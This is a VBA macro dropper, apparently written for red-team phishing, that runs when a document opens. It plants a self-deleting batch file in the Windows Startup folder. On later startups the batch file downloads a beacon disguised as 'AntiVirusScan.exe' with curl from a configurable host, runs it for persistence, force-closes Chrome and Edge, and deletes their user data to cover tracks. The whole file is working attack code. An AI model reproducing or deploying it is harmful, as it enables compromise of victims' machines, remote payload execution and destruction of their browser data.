Sub document_open()
    ' Use the Phishing e-mail to social engineer into enabling macros for the purpose of enabling digital signature of document.

    ' This script will create a batch file in the Startup directory (will run on next startup)
    ' Batch file will:
    '   - Download beacon to Startup directory
    '   - Execute beacon (every startup - persistence) 
    '   - Clear browsing history and cache
    '   - Delete itself

    ' This COA (drop batch, run on subesquent startup) was chosen because there was 
    '   trouble getting AMSI Bypass working (errors with the SaveAs2 commands failing)
    '   AMSI Bypass Code: https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/AMSIbypasses.vba

    ' ---------------------------------------------------------
    ' ---- RED TEAMS UPDATE BEACON HOST & EXEC NAME -----------
    ' Beacon host site
    beacon_host = "https://file-examples.com/wp-content/storage/2017/02/file-sample_500kB.doc"
    beacon_exec_name = "AntiVirusScan.exe"
    
    ' ----- END Red Team Updates ------------------------------
    ' ---------------------------------------------------------


    ' Create Batch file
    ' Primer code source: https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/Dropper_Autostart.vba
    myPath = CreateObject("WScript.Shell").SpecialFolders("Startup")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(myPath & "\policy_updates.bat", True)

    ' Download the executable to Startup
    ' - Command to start the batch file minimized, if not already minimized
    ObjFile.Write "if not ""%Minimized%"" == """" goto :Minimized"  & vbCrLf
    ObjFile.Write ":Minimized"
    ObjFile.Write "set Minimized=True"  & vbCrLf
    ObjFile.Write "start /min cmd /C ""%~dpnx0"" " & vbCrLf

    ' - Command to download the beacon and wait 15 seconds
    objFile.Write "set ""url=" & beacon_host & " "" " & vbCrLf
    objFile.Write "set ""out_file=" & beacon_exec_name & " "" " & vbCrLf
    objFile.Write "curl %url% -o %out_file%" & vbCrLf
    objFile.Write "timeout /t 3 > nul" & vbCrLf

    ' - Command to check that the beacon downloaded, either wait or exec
    '   NOTE - this was buggy. Leaving in here for future use. Batch file waits for download before moving on
    ' objFile.Write ":Check_For_Beacon" & vbCrLf
    ' objFile.Write "if exist " & beacon_exec_name & "(" & vbCrLf
    ' objFile.Write " goto :Execute_Beacon" & vbCrLf
    ' objFile.Write ")" & vbCrLf
    ' objFile.Write "else (" & vbCrLf
    ' objFile.Write "timeout /t 15 > nul" & vbCrLf
    ' objFile.Write "goto: Check_For_Beacon" & vbCrLf
    ' objFile.Write ")" & vbCrLf

    ' - Execute the beacon
    objFile.Write "start """" " & beacon_exec_name & vbCrLf

    ' - Clear Chrome browsing data
    objFile.Write "taskkill /F /IM chrome.exe >nul 2>&1" & vbCrLf
    objFile.Write "set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data" & vbCrLf
    objFile.Write "del /q /s /f ""%ChromeDir%"" " & vbCrLf
    objFile.Write "rd /s /q ""%ChromeDir%"" " & vbCrLf
    ' Clear Edge browsing data
    ObjFile.Write "taskkill /F /IM msedge.exe >nul 2>&1" & vbCrLf
    ObjFile.Write "rmdir /s /q ""%LOCALAPPDATA%\Microsoft\Edge\User Data"" " & vbCrLf
    ObjFile.Write "mkdir ""%LOCALAPPDATA%\Microsoft\Edge\User Data"" " & vbCrLf

    ' Delete the batch file
    ObjFile.Write "del ""%~f0"" " & vbCrLf

    objFile.Close


End Sub